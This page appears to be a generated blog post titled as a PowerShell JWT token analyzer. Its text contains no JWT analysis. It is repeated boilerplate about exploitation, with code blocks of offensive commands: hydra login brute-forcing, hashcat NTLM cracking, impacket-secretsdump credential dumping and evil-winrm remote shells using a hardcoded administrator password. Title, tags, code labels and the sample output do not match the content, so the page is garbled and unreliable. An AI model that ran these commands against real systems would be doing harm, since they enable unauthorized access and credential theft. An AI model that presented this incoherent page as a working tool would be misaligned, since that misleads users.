---
TitleSEO: "JWT Token Analyzer in PowerShell | ZureFX"
TitlePost: "JWT Token Analyzer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for jwt token analyzer. Built for security research and automation."
Keywords: "bash, automation, fuzzer, c, go, powershell"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-453.html"
URL_IMAGES: ""
Date: "2024-04-28"
Tags: "Bash, Automation, Fuzzer, C, Go, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-453"
Permalink: "/scripting/script-jwt-token-analyzer-453.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `pwncat`
- `smbclient`
- `rpcclient`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
nmap -sCV -p53,135,389 10.122.237.109 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.242.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.108.190/FUZZ
evil-winrm -i 10.51.203.33 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p993,993,443 10.30.86.79 -oN scan.txt
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.32.47.66 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.60.218
nmap -sCV -p23,389,3389 10.65.60.149 -oN scan.txt
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
evil-winrm -i 10.32.237.19 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 12.62s
```
